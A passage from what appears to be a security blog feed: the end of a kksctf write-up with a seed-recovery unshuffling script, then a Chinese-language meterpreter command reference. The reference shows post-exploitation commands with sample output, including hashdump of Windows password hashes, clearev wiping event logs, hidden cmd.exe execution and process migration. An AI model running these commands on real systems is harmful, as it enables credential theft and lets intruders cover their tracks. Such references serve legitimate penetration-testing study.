src="/2019/12/30/kksctf-writeup/flag1.png" alt="flag"></p><ul><li>flag: kks{thanks_f0r_m@1l}</li></ul><h3 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h3><h4 id="Every-day-I’m-shuffling"><a href="#Every-day-I’m-shuffling" class="headerlink" title="Every day I’m shuffling"></a>Every day I’m shuffling</h4><p>I didn’t solved this chall because I used python2 to reverse it, then I can’t find the seed. You should use python3 and linux to reverse it, because some byte code way’s diffenert. The last <code>solve.py</code> is:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin python3</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># For kksctf-shufflout.py</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Shuffle</span>(<span class="params">p, data</span>):</span></span><br><span class="line">    buf = <span class="built_in">list</span>(data)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(data)):</span><br><span class="line">        buf[i] = data[p[i]]</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">reverse_index</span>(<span class="params">p</span>):</span></span><br><span class="line">    ans = [<span class="number">-1</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p))]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(p)):</span><br><span class="line">        ans[p[i]] = i</span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    file_name = <span class="string">&quot;message_from_above&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">19</span>):</span><br><span class="line">        seed(i)</span><br><span class="line">        file_name_list = <span class="built_in">list</span>(file_name)</span><br><span class="line">        shuffle(file_name_list)</span><br><span class="line">        shuffle_name = <span class="string">&#x27;&#x27;</span>.join(file_name_list)</span><br><span class="line">        <span class="keyword">if</span> shuffle_name == <span class="string">&quot;fsegovs_meaoerbma_&quot;</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;seed:&quot;</span>, i)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># The above show the seed is 3</span></span><br><span class="line">    data = <span class="built_in">open</span>(<span class="string">&#x27;fsegovs_meaoerbma_.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>).read()</span><br><span class="line">    p = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="built_in">len</span>(data))) <span class="comment"># get the same permuation</span></span><br><span class="line">    shuffle(p)</span><br><span class="line">    p = reverse_index(p)</span><br><span class="line">    data = Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,Shuffle(p,data))))))))))))))))))))))))))))))))))))))))</span><br><span class="line">    out = <span class="built_in">open</span>(<span class="string">&#x27;origin.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    out.write(<span class="string">&#x27;&#x27;</span>.join(data))</span><br><span class="line">    out.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">$ python3.7 shufllout.py</span><br><span class="line">seed: 3</span><br><span class="line">$ cat origin.txt</span><br><span class="line">Once upon a midnight dreary, <span class="keyword">while</span> I pondered, weak and weary,</span><br><span class="line">Over many a quaint and curious volume of forgotten lore—</span><br><span class="line">    While I nodded, nearly napping, suddenly there came a tapping,</span><br><span class="line">As of some one gently rapping, rapping at my chamber door.</span><br><span class="line">“’Tis some visitor,” I muttered, “tapping at my chamber door—</span><br><span class="line">            Only this and nothing more.”</span><br><span class="line"></span><br><span class="line">    Ah, distinctly I remember it was <span class="keyword">in</span> the bleak December;</span><br><span class="line">And each separate dying ember wrought its ghost upon the floor.</span><br><span class="line">    Eagerly I wished the morrow;—vainly I had sought to borrow</span><br><span class="line">    From my books surcease of sorrow—sorrow <span class="keyword">for</span> the lost Lenore—</span><br><span class="line">For the rare and radiant maiden whom the angels name Lenore—</span><br><span class="line">            Nameless here <span class="keyword">for</span> evermore.</span><br><span class="line"></span><br><span class="line">    And the silken, sad, uncertain rustling of each purple curtain</span><br><span class="line">Thrilled me—filled me with fantastic terrors never felt before;</span><br><span class="line">    So that now, to still the beating of my heart, I stood repeating</span><br><span class="line">    “’Tis some visitor entreating entrance at my chamber door—</span><br><span class="line">Some late visitor entreating entrance at my chamber door;—</span><br><span class="line">            This it is and nothing more.”</span><br><span class="line"></span><br><span class="line">    Presently my soul grew stronger; hesitating <span class="keyword">then</span> no longer,</span><br><span class="line">“Sir,” said I, “or Madam, truly your forgiveness I implore;</span><br><span class="line">    But the fact is I was napping, and so gently you came rapping,</span><br><span class="line">    And so faintly you came tapping, tapping at my chamber door,</span><br><span class="line">That I scarce was sure I heard you”—here I opened wide the door;—</span><br><span class="line">            Darkness there and nothing more.</span><br><span class="line"></span><br><span class="line">    Deep into that darkness peering, long I stood there wondering, fearing,</span><br><span class="line">Doubting, dreaming dreams no mortal ever dared to dream before;</span><br><span class="line">    But the silence was unbroken, and the stillness gave no token,</span><br><span class="line">    And the only word there spoken was the whispered word, “Lenore?”</span><br><span class="line">This I whispered, and an <span class="built_in">echo</span> murmured back the word, “Lenore!”—</span><br><span class="line">            Merely this and nothing more.</span><br><span class="line"></span><br><span class="line">    Back into the chamber turning, all my soul within me burning,</span><br><span class="line">Soon again I heard a tapping somewhat louder than before.</span><br><span class="line">    “Surely,” said I, “surely that is something at my window lattice;</span><br><span class="line">      Let me see, <span class="keyword">then</span>, what thereat is, and this mystery explore—</span><br><span class="line">Let my heart be still a moment and this mystery explore;—</span><br><span class="line">            ’Tis the wind and nothing more!”</span><br><span class="line"></span><br><span class="line">    Open here I flung the shutter, when, with many a flirt and flutter,</span><br><span class="line">In there stepped a stately Raven of the saintly days of yore;</span><br><span class="line">    Not the least obeisance made he; not a minute stopped or stayed he;</span><br><span class="line">    But, with mien of lord or lady, perched above my chamber door—</span><br><span class="line">Perched upon a bust of Pallas just above my chamber door—</span><br><span class="line">            Perched, and sat, and nothing more.</span><br><span class="line"></span><br><span class="line">Then this ebony bird beguiling my sad fancy into smiling,</span><br><span class="line">By the grave and stern decorum of the countenance it wore,</span><br><span class="line">“Though thy crest be shorn and shaven, thou,” I said, “art sure no craven,</span><br><span class="line">Ghastly grim and ancient Raven wandering from the Nightly shore—</span><br><span class="line">Tell me what thy lordly name is on the Night’s Plutonian shore!”</span><br><span class="line">            Quoth the Raven “kks&#123;5huffl3_5huffl3_5huffl3&#125;”</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>flag: kks{5huffl3_5huffl3_5huffl3}</li></ul>]]></content>
      
      
      <categories>
          
          <category> Writeups </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kksctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>meterpreter常用命令</title>
      <link href="2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h2 id="METERPRETER命令用法"><a href="#METERPRETER命令用法" class="headerlink" title="METERPRETER命令用法"></a>METERPRETER命令用法</h2><p>所有的命令都会涉及到，若没有，实践是检验的唯一标准。</p><h2 id="HELP"><a href="#HELP" class="headerlink" title="HELP"></a>HELP</h2><p>展示帮助菜单：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">help</span></span><br><span class="line"></span><br><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    ?             Help menu</span><br><span class="line">    background    Backgrounds the current session</span><br><span class="line">    channel       Displays information about active channels</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure><h2 id="BACKGROUND"><a href="#BACKGROUND" class="headerlink" title="BACKGROUND"></a>BACKGROUND</h2><p>把当前session放到后台，然后返回‘msf’提示的命令行，如果要返回session，使用sessions命令选择：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf exploit(ms08_067_netapi) &gt; sessions -i 1</span><br><span class="line">[*] Starting interaction with 1...</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="CAT"><a href="#CAT" class="headerlink" title="CAT"></a>CAT</h2><p>查看文件内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; cat</span><br><span class="line">Usage: cat file</span><br><span class="line"></span><br><span class="line">Example usage:</span><br><span class="line">meterpreter &gt; cat edit.txt</span><br><span class="line">What you talkin<span class="string">&#x27; about Willis</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">meterpreter &gt;</span></span><br></pre></td></tr></table></figure><h2 id="CD-AND-PWD"><a href="#CD-AND-PWD" class="headerlink" title="CD AND PWD"></a>CD AND PWD</h2><p>切换目录，查看当前目录：</p><p>参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>:Path of the folder to change to</span><br><span class="line"><span class="built_in">pwd</span>:None required</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; pwd</span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; cd c:\windows</span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="CLEAREV"><a href="#CLEAREV" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>清除Windows上的日志，（Clear Event），Windows上的日志可以使用事件查看器（Event Viewer）来查看：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span>:Path of the folder to change to</span><br><span class="line"><span class="built_in">pwd</span>:None required</span><br></pre></td></tr></table></figure><p>Example usuage:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\</span><br><span class="line">meterpreter &gt; <span class="built_in">cd</span> c:\windows</span><br><span class="line">meterpreter &gt; <span class="built_in">pwd</span></span><br><span class="line">c:\windows</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="CLEAREV-1"><a href="#CLEAREV-1" class="headerlink" title="CLEAREV"></a>CLEAREV</h2><p>The <strong>clearev</strong> command will clear the <em>Application</em>, <em>System</em>, and <em>Security</em> logs on a <em>Windows</em> system. There are no options or arguments.</p><p><a href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_before.png"><img src="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_before.png" alt="Before using Meterpreter to clear the logs | Metasploit Unleashed"></a></p><p>上面是没有使用<strong>clearev</strong>命令清除前。</p><p>用法:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; clearev</span><br><span class="line">[*] Wiping 97 records from Application...</span><br><span class="line">[*] Wiping 415 records from System...</span><br><span class="line">[*] Wiping 0 records from Security...</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p><a href="https://www.offensive-security.com/wp-content/uploads/2015/05/Clearev_after.png"><img src="/2019/12/29/meterpreter%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/Clearev_after.png" alt="After using Meterpreter to clear the logs | Metasploit Unleashed"></a></p><p>上图是清除后的Windows系统日志。</p><h2 id="DOWNLOAD"><a href="#DOWNLOAD" class="headerlink" title="DOWNLOAD"></a>DOWNLOAD</h2><p>从目标机上下载文件，注意路径需要使用两个反斜杠：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; download c:\\boot.ini</span><br><span class="line">[*] downloading: c:\boot.ini -&gt; c:\boot.ini</span><br><span class="line">[*] downloaded : c:\boot.ini -&gt; c:\boot.ini/boot.ini</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="EDIT"><a href="#EDIT" class="headerlink" title="EDIT"></a>EDIT</h2><p>使用<strong>vim</strong> 编辑文件：</p><p>示例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">.</span><br><span class="line">...snip...</span><br><span class="line">.</span><br><span class="line">100666/rw-rw-rw-  0       fil   2012-03-01 13:47:10 -0500  edit.txt</span><br><span class="line"></span><br><span class="line">meterpreter &gt; edit edit.txt</span><br></pre></td></tr></table></figure><p>查看更高级的用法.<a href="http://www.vim.org/">http://www.vim.org/</a></p><h2 id="EXECUTE"><a href="#EXECUTE" class="headerlink" title="EXECUTE"></a>EXECUTE</h2><p>在目标机器上执行命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; execute -f cmd.exe -i -H</span><br><span class="line">Process 38320 created.</span><br><span class="line">Channel 1 created.</span><br><span class="line">Microsoft Windows XP [Version 5.1.2600]</span><br><span class="line">(C) Copyright 1985-2001 Microsoft Corp.</span><br><span class="line"></span><br><span class="line">C:\WINDOWS\system32&gt;</span><br></pre></td></tr></table></figure><h2 id="GETUID"><a href="#GETUID" class="headerlink" title="GETUID"></a>GETUID</h2><p>返回目标主机的服务器名字：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getuid</span><br><span class="line">Server username: NT AUTHORITY\SYSTEM</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="HASHDUMP"><a href="#HASHDUMP" class="headerlink" title="HASHDUMP"></a>HASHDUMP</h2><p>dump出Windows上SAM数据库的内容：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/hashdump </span><br><span class="line"></span><br><span class="line">[*] Obtaining the boot key...</span><br><span class="line">[*] Calculating the hboot key using SYSKEY 8528c78df7ff55040196a9b670f114b6...</span><br><span class="line">[*] Obtaining the user list and keys...</span><br><span class="line">[*] Decrypting user keys...</span><br><span class="line">[*] Dumping password hashes...</span><br><span class="line"></span><br><span class="line">Administrator:500:b512c1f3a8c0e7241aa818381e4e751b:1891f4775f676d4d10c09c1225a5c0a3:::</span><br><span class="line">dook:1004:81cbcef8a9af93bbaad3b435b51404ee:231cbdae13ed5abd30ac94ddeb3cf52d:::</span><br><span class="line">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">HelpAssistant:1000:9cac9c4683494017a0f5cad22110dbdc:31dcf7f8f9a6b5f69b9fd01502e6261e:::</span><br><span class="line">SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:36547c5a8a3de7d422a026e51097ccc9:::</span><br><span class="line">victim:1003:81cbcea8a9af93bbaad3b435b51404ee:561cbdae13ed5abd30aa94ddeb3cf52d:::</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="IDLETIME"><a href="#IDLETIME" class="headerlink" title="IDLETIME"></a>IDLETIME</h2><p>返回远程主机用户在线的时长：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; idletime</span><br><span class="line">User has been idle <span class="keyword">for</span>: 5 hours 26 mins 35 secs</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="IPCONFIG"><a href="#IPCONFIG" class="headerlink" title="IPCONFIG"></a>IPCONFIG</h2><p>查看远程主机的网络配置情况：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ipconfig</span><br><span class="line"></span><br><span class="line">MS TCP Loopback interface</span><br><span class="line">Hardware MAC: 00:00:00:00:00:00</span><br><span class="line">IP Address  : 127.0.0.1</span><br><span class="line">Netmask     : 255.0.0.0</span><br><span class="line"></span><br><span class="line">AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport</span><br><span class="line">Hardware MAC: 00:0c:29:10:f5:15</span><br><span class="line">IP Address  : 192.168.1.104</span><br><span class="line">Netmask     : 255.255.0.0</span><br><span class="line"></span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="LPWD-AND-LCD"><a href="#LPWD-AND-LCD" class="headerlink" title="LPWD AND LCD"></a>LPWD AND LCD</h2><p>查看本地的当前目录和改变本地的目录，即攻击者的目录：</p><p>参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lpwd:None required</span><br><span class="line">lcd:Destination folder</span><br></pre></td></tr></table></figure><p>示例:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/root</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lcd MSFU</span><br><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/root/MSFU</span><br><span class="line"></span><br><span class="line">meterpreter &gt; lcd /var/www</span><br><span class="line">meterpreter &gt; lpwd</span><br><span class="line">/var/www</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="LS"><a href="#LS" class="headerlink" title="LS"></a>LS</h2><p>列出远程主机当前目录下的文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\victim</span><br><span class="line">=========================================</span><br><span class="line"></span><br><span class="line">Mode              Size     Type  Last modified                   Name</span><br><span class="line">----              ----     ----  -------------                   ----</span><br><span class="line">40777/rwxrwxrwx   0        dir   Sat Oct 17 07:40:45 -0600 2009  .</span><br><span class="line">40777/rwxrwxrwx   0        dir   Fri Jun 19 13:30:00 -0600 2009  ..</span><br><span class="line">100666/rw-rw-rw-  218      fil   Sat Oct 03 14:45:54 -0600 2009  .recently-used.xbel</span><br><span class="line">40555/r-xr-xr-x   0        dir   Wed Nov 04 19:44:05 -0700 2009  Application Data</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure><h2 id="MIGRATE"><a href="#MIGRATE" class="headerlink" title="MIGRATE"></a>MIGRATE</h2><p>注入到另外一个进程中去：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/manage/migrate </span><br><span class="line"></span><br><span class="line">[*] Running module against V-MAC-XP</span><br><span class="line">[*] Current server process: svchost.exe (1076)</span><br><span class="line">[*] Migrating to explorer.exe...</span><br><span class="line">[*] Migrating into process ID 816</span><br><span class="line">[*] New server process: Explorer.EXE (816)</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><h2 id="PS"><a href="#PS" class="headerlink" title="PS"></a>PS</h2><p>列出目标当前正在运行的进程：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; ps</span><br><span class="line"></span><br><span class="line">Process list</span><br><span class="line">============</span><br><span class="line"></span><br><span class="line">    PID   Name                  Path</span><br><span class="line">    ---   ----                  ----</span><br><span class="line">    132   VMwareUser.exe        C:\Program Files\VMware\VMware Tools\VMwareUser.exe</span><br><span class="line">    152   VMwareTray.exe        C:\Program Files\VMware\VMware Tools\VMwareTray.exe</span><br><span class="line">    288   snmp.exe              C:\WINDOWS\System32\snmp.exe</span><br><span class="line">...snip...</span><br></pre></td></tr></table></figure><h2 id="RESOURCE"><a href="#RESOURCE" class="headerlink" title="RESOURCE"></a>RESOURCE</h2><p><strong>resource</strong> 命令会一行一行地执行文本文件里的meterpreter命令，默认情况下，命令是在目标机的当前目录下执行，而resource文件则是在攻击机本地工作目录下。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; resource </span><br><span class="line">Usage: resource path1 path2Run the commands stored <span class="keyword">in</span> the supplied files.</span><br><span class="line">meterpreter &gt;</span><br></pre></td></tr></table></figure><p>参数:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">path1:包含要执行的命令的文件的位置</span><br><span class="line">Path2Run:在文件中找到的执行命令的位置</span><br></pre></td></tr></table></figure><p><strong>示例</strong><br>使用的resource文件如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~<span class="comment"># cat resource.txt</span></span><br><span class="line">ls</span><br><span class="line">background</span><br><span class="line">root@kali:~<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>执行resource命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt; &gt; resource resource.txt</span><br><span class="line">[*] Reading /root/resource.txt</span><br><span class="line">[*] Running ls</span><br><span class="line"></span><br><span class="line">Listing: C:\Documents and Settings\Administrator\Desktop</span><br><span class="line">========================================================</span><br><span class="line"></span><br><span class="line">Mode              Size    Type  Last modified              Name</span><br><span class="line">----              ----    ----  -------------              ----</span><br><span class="line">40777/rwxrwxrwx   0       dir   2012-02-29 16:41:29 -0500  .</span><br><span class="line">40777/rwxrwxrwx   0       dir   2012-02-02 12:24:40 -0500  ..</span><br><span class="line">100666/rw-rw-rw-  606     fil   2012-02-15 17:37:48 -0500  IDA Pro Free.lnk</span><br><span class="line">100777/rwxrwxrwx  681984  fil   2012-02-02 15:09:18 -0500  Sc303.exe</span><br><span class="line">100666/rw-rw-rw-  608     fil   2012-02-28 19:18:34 -0500  Shortcut to Ability Server.lnk</span><br><span class="line">100666/rw-rw-rw-  522     fil   2012-02-02 12:33:38 -0500  XAMPP Control Panel.lnk</span><br><span class="line"></span><br><span class="line">[*] Running background</span><br><span class="line"></span><br><span class="line">[*] Backgrounding session 1...</span><br><span class="line">msf  